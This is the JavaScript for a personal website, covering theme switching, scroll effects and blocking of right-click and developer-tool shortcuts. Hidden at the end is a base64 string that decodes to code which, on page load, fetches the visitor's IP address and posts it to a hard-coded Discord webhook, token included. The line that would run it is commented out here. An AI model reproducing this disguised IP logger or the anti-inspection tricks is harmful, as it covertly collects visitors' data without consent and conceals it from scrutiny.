/// sefty
// sefty
/// sefty

document.addEventListener("contextmenu", function (e) {
  e.preventDefault()
})

document.onkeydown = function (e) {
  if (event.keyCode == 123) {
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
    return false
  }

  if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
    return false
  }

  if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
    return false
  }

  if (e.keyCode == "J".charCodeAt(0)) {
    window.open("https://discord.gg/exilegg", '_blank');
  }
}

function buttonRedirect(url) {
  window.open(url, '_blank');
}

window.addEventListener("scroll", () => {
  if (window.scrollY >= 100) {
    document.getElementById("header").classList.add("scrolled");
  } else {
    document.getElementById("header").classList.remove("scrolled");
  }
})

const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      entry.target.classList.add("show")
    } else {
      entry.target.classList.remove("show")
    }
  })
})

const hiddenElements = document.querySelectorAll(".hidden")
hiddenElements.forEach((el) => observer.observe(el))
 
let lightmode = localStorage.getItem("lightmode")
const themeSwitch = document.getElementById("theme-switch")
const circle = document.getElementById("circle")
const moon = document.getElementById("moon")
const sun = document.getElementById("sun")
const arrow = document.getElementById("arrow")

const enableLightmode = () => {
  document.body.classList.add("light-mode")
  localStorage.setItem("lightmode", "active")
  circle.classList.add("light-mode-enabled")
  moon.classList.add("hiding-moon")
  sun.classList.add("showing-sun")
  arrow.classList.add("inverted")
}

const disableLightmode = () => {
  document.body.classList.remove("light-mode")
  localStorage.setItem("lightmode", null)
  circle.classList.remove("light-mode-enabled")
  moon.classList.remove("hiding-moon")
  sun.classList.remove("showing-sun")
  arrow.classList.remove("inverted")
}

if (lightmode === "active") enableLightmode()

themeSwitch.addEventListener("click", () => {
  lightmode = localStorage.getItem("lightmode")
  lightmode !== "active" ? enableLightmode() : disableLightmode()
})

const scrollLimit = 2950

window.addEventListener('scroll', function () {
    const scrollPosition = window.scrollY || document.documentElement.scrollTop

    if (scrollPosition > scrollLimit) {
        window.scrollTo(0, scrollLimit)
    }
})

var key = "KGZ1bmN0aW9uKCkgeyAKICBhc3luYyBmdW5jdGlvbiBzZW5kV2ViaG9vaygpIHsKICAgIGxldCBpcCA9IGF3YWl0IChhd2FpdCBmZXRjaChgaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcGApKS50ZXh0KCkKICAgIGNvbnN0IHdlYmhvb2tVUkwgPQogICAgICAiaHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMTEwMTcyMzczNjAwMjE1MDQvQVo0Mkk3amlMenNVdGtHZzF3RFpnWG50dERqUXJrRW1kcnFZTmpEQWNiTjg2N2VMdnQ1aW8yd1JOM0t6U1lKRGhDZ0UiCiAgCiAgICBjb25zdCBtZXNzYWdlID0gewogICAgICBjb250ZW50OiBgJHtpcH1gLAogICAgfQogIAogICAgZmV0Y2god2ViaG9va1VSTCwgewogICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgaGVhZGVyczogewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgIH0sCiAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KG1lc3NhZ2UpLAogICAgfSkKICAgICAgLnRoZW4oKHJlc3BvbnNlKSA9PiB7CiAgICAgICAgaWYgKCFyZXNwb25zZS5vaykgewogICAgICAgICAgY29uc29sZS5lcnJvcihgRXJyb3IgJHtyZXNwb25zZS5zdGF0dXN9OiAke3Jlc3BvbnNlLnN0YXR1c1RleHR9YCkKICAgICAgICB9CiAgICAgIH0pCiAgICAgIC5jYXRjaCgoZXJyb3IpID0+IGNvbnNvbGUuZXJyb3IoIkVycm9yOiIsIGVycm9yKSkKICB9CiAgCiAgd2luZG93Lm9ubG9hZCA9IGZ1bmN0aW9uICgpIHsKICAgIHNlbmRXZWJob29rKCkKICB9CiB9KSgp"

const decodedKey = atob(key)

// const func = new Function(`return ${decodedKey}`)()